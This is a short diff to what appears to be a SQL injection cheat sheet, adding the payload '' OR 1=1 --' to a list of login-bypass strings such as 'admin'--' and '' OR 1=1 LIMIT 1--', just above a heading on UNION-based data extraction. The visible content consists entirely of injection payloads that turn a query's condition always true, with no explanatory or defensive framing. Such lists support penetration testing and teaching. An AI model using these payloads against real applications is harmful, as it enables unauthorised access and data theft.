@@ -102,6 +102,7 @@ admin'--
 admin' #
 admin' or 1=1--
 ' OR 1=1 LIMIT 1--
+' OR 1=1 --
 ```
 
 ### UNION-Based Data Extraction
